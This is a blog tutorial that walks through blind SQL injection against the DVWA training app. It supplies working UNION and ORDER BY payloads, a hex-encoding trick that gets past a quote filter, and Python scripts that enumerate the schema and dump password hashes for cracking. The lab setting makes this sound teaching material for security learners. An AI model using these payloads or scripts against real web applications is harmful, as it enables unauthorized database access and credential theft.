---
layout: post
title: Hacking Blindfolded - Exploiting SQL injections with no error output
categories:
- web hacking
- sqli
---

![Jedi](http://33.media.tumblr.com/56e063d50ae646cfc69dc6da74321b68/tumblr_nk2rndy28N1u8r6nao1_500.gif)

In many cases, developers faced with patching a SQL injection will attempt to be clever by turning off error output instead of trying to fix their broken code. This results in a situation in which the target web page is vulnerable to SQLi, but no messages from the database are shown except for the intended output onto the page. This forces us to get creative when attempting to extract information from the target database. 

Fortunately, we don’t actually need the error output. It’s possible to get a ton of information without it.

This tutorial makes use of the Blind SQL Injection challenge on the training application __Damn Vulnerable Web App__ (a.k.a. dvwa). The easiest way to install __DVWA__ is by downloading and installing OWASP’s Broken Web Applications (BWA) VM. You can find it [here](https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project).

OWASP’s BWA VM works best with VMWare, but you can also run it using VirtualBox or Qemu. 

Once you launch the OWASP virtual machine, take a quick look at the form we’re going to be attacking. You can find it at:
    
    http://192.168.1.170/dvwa/vulnerabilities/sqli_blind/

Just replace the shown IP address with the IP address of your virtual machine. Notice that when we enter a value into the form, the form sends the parameters to the server using a GET request. This means that we can also send data to the server using the URL as shown below.

![the form]({{ site.baseurl }}images/hacking-blind/the-form.png)

This is how we’ll be sending data to the server for most of this tutorial. For the sake of not filling up our entire page with urls, we'll be omitting the url at the begining of each query. Assume that when you see a query in the form of:

	id=...

It really means:

	http://192.168.1.170/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit&id=...

Now that we have that out of the way, let’s start out by making a valid query: 

	id=1;#

As we can see below, the valid query placed output on the web page.

![yes]({{ site.baseurl }}images/hacking-blind/yes-output.png)

Let’s now try an invalid query: 

    id=-1;#

This time, there is no output on the web page. 

![no]({{ site.baseurl }}images/hacking-blind/no-output.png)

Output on the page means valid query. No output on the page means error or invalid query. Simple enough. True for successful query, false for unsuccessful. The key to blind SQL injection is finding a way to reduce queries into true or false outputs without relying on error messages. Since we’ve just done that, let’s pwn this web app. 



#Layer 0 - Number of Columns in Current Table

Before we do anything else, we need need to know the number of columns in the current table. We do this using the ORDER BY clause. MySQL’s ORDER BY clause sorts the results of a query by a specified column. ORDER BY 1 tells MySQL to sort by the first column. ORDER BY 2 tells MySQL to sort by the second column.


![order by](http://cdn.guru99.com/images/gender_order_asc(1).png)
___ORDER BY 3 - sort by 3rd column___


What happens if we ORDER BY a column that doesn’t exist in the current table? For example, if the table only contains 4 columns and we attempt to ORDER BY 5? Simple -- we get an error.

This means we can determine the number of columns in the current table by finding the highest ORDER BY that does not give us an error. 

We start out by constructing a valid query:

    id=1;#

We then attempt to ORDER BY the database’s first column, because we know the query will be valid. We do this to ensure that ORDER BY is actually enabled and not being filtered by a firewall. 

	id=1 ORDER BY 1;#

The query succeeds! We have confirmed that we can use ORDER BY without any restrictions. Now let’s try to find a possible ORDER BY that does not cause an error. We start with ORDE BY 10:

    id=1 ORDER BY 10;#

The page is blank, which means we have an error. Therefore we know that there are less than 10 columns in the current table. Now let’s try ORDER BY 5:

	id=1 ORDER BY 5;# 

We still get an error, as indicated by the blank page. Hence we know that there are less than 5 columns in the current table. Let’s try ORDER BY 2:

	id=1 ORDER BY 2;#

Success! We have output on the page. This tells us that our query was valid, and that there are at least two columns in the current table. Let’s guess a number between 2 and 5, and ORDER BY it: 

	id=1 ORDER BY 3;#

We get a blank page once again. Notice how ORDER BY 3 gives us an error, but ORDER BY 2 does not. This means that there is a column in position 2, but there is no column in position 3. This tells us that there are exactly two columns in the current table. 

#Layer 1 - Database Fingerprinting


We now have a count of the number of columns in the current table. This is all the information we need to start fingerprinting the database. We'll do this by using SQL's UNION clause to make queries across multiple tables.

![Union](http://cdn.guru99.com/images/Table1UnionTable2ALL.png)

We need to figure out where the values for each column are showing up in our output. We do this by deliberately creating a query that returns no results:

	id=-1;#

We then combine it with a query for the values 1,2 from an arbitrary table using UNION ALL:

	id=-1 UNION ALL SELECT 1,2;#

This query gives us the following output:

![Index page]({{ site.baseurl }}images/hacking-blind/union-all-1.png)

As we can see, first name now has a value of 1 and Surname has a value of 2. This tells us that the contents of the first column will show up on the page next to the label First name, and the contents of the second column will show up next to the label Surname.


Now that we know where each column will be displayed on the web page, we can start fingerprinting the database. We'll start by obtaining the database's version string and database server's hostname. We'll place the version string in column 1, and the hostname in column 2:

	id=-1 UNION SELECT ALL @@version,@@hostname;#

We then use the same technique to obtain the current database user and path:

	id=-1 UNION SELECT ALL user(), @@datadir;#

Finally, we obtain the name of the current database and display it in column 1:

	id=-1 UNION SELECT ALL database(), 2;#

# Layer 2 - Database Schema

We have successfully fingerprinted the database. The next step in the exploitation process is to reverse engineer the database schema. We do this by making a UNION with the database information\_schema table. The information\_schema table contains information about the structure of the database itself.

Let's make a list of all the tables and columns in the current database. Recall from the last section that the current database is named 'dvwa'. This means that we must construct a query that retrieves all table and column names where table\_schema is equal to 'dvwa'. Translated into a SQL query, this logic looks like:

	id=-1 UNION SELECT ALL table_name, column_name FROM information_schema.columns WHERE table_schema LIKE ‘dvwa’;#

However, this query fails, as you can see from the following screenshot. Since the target web application filters out quotation marks, the argument to our LIKE clause is mangled and causes the query to fail.

![Failz0rz]({{ site.baseurl }}images/hacking-blind/query-fail-1.png)


Filter evasion is simple enough, however. We simply encode the word 'dvwa' as a hex value, and MySQL will evaluate it as a string:


	id=-1 UNION SELECT ALL table_name, column_name FROM information_schema.columns WHERE table_schema LIKE 0x64767761;#

Our query succeeds, as shown below. However, suppose the page only allows us to display a single result at a time. This kind of situation is quite common, and can severely limit our ability to obtain information from the database.

![Failz0rz]({{ site.baseurl }}images/hacking-blind/query-success-1.png)

In these situations, we need to find a way to display each column one at a time. This can be accomplished using MySQL's LIMIT and OFFSET clauses.

	id=-1 UNION SELECT ALL table_name, column_name FROM information_schema.columns WHERE table_schema LIKE 0x64767761 LIMIT 1 OFFSET 1;#

We can then then write short Python script that uses a similar query to reconstruct the schema of the current database. For the sake of brevity, we've left out the script's auxiliary code (login code, query making code, etc). The complete script can be found on [github](http://github.com/s0lst1c3/dvwa_blind_sqli).

{% highlight python %}

TARGET = 'http://192.168.1.170/dvwa'
SQLI_PAGE = '%s/%s' % (TARGET, 'vulnerabilities/sqli_blind/')

SCHEMA_QUERY = '-1 UNION SELECT ALL table_name, column_name FROM information_schema.columns WHERE table_schema LIKE 0x64767761 LIMIT 1 OFFSET %d;#'


if __name__ == '__main__':

    database = {}

    # LAYER 2 - DATABASE SCHEMA

    database['tables'] = {}

    i = 0
    result = make_query(SCHEMA_QUERY % i)
    while result is not None:

        table_name = result['1']
        column_name = result['2']

        if table_name in database['tables']:
            database['tables'][table_name]['columns'].append(column_name)
        else:
            database['tables'][table_name] = {
                'name' : table_name,
                'schema' : database['schema'],
                'columns' : [ column_name ],
            }

        i += 1
        result = make_query(SCHEMA_QUERY % i)

    pprint(database)

{% endhighlight %}

Running the completed script gives not only outputs every column in the current database, but reassmbles the tables column by column.

![Scriptz0rz]({{ site.baseurl }}images/hacking-blind/schema.png)

#Layer 3 - Dumping Creds

We’ve completely reconstructed the databases schema. Now it’s time to start dumping creds. Recalling the output from the script we ran in the previous section, notice that there is a “users” table with both “user” and “password” columns. We want to retrieve those columns and display them on the screen. We can do that with the following query:

	id=-1 UNION SELECT ALL user,password FROM users;#

If we were in a situation where we could only retrieve a single result at a time, we could script a series of consecutive queries as we did when we reconstructed the database schema.

{% highlight python %}

USER_QUERY = '-1 UNION SELECT ALL user,password FROM users LIMIT 1 OFFSET %d;# '

if __name__ == '__main__':

    i = 0
    result = make_query(USER_QUERY % i)
    while result is not None:

        database['creds'].append({
            'user' : result['1'],
            'password' : result['2'],
        })

        i += 1
        result = make_query(USER_QUERY % i)

    pprint(database)

    for c in database['creds']:
        print c['password']

{% endhighlight %}

Once again, I’m omitting the script’s meat and potatoes for brevity, but I definitely encourage you to check out the complete code on github. 

![Scriptz0rz]({{ site.baseurl }}images/hacking-blind/creds.png)

Our script’s output is shown above. We just need to crack the hashes shown in the ‘password’ field. Luckily for us, the password hashes are weak md5’s, so we can crack them rather effortlessly at crackstation.com. This gives us the following output:

![Scriptz0rz]({{ site.baseurl }}images/hacking-blind/crack-station.png)

And presto. We have the creds to the web application. Here's a demo of what the complete attack should look like.

<iframe width="560" height="315" src="https://youtube.com/embed/B_Sf0r8OHuw" frameborder="0" allowfullscreen></iframe>


# Conclusion

Blind SQL injections really aren’t that scary. By following a solid methodology, they can be exploited just as easily as error based injections. Because of the privs our database user had on dvwa’s database, we had to stop with dumping creds and weren’t able to move on to popping a shell on the target box. We will be going over that in the next blog post though, so stay tuned. Happy hacking. ;)
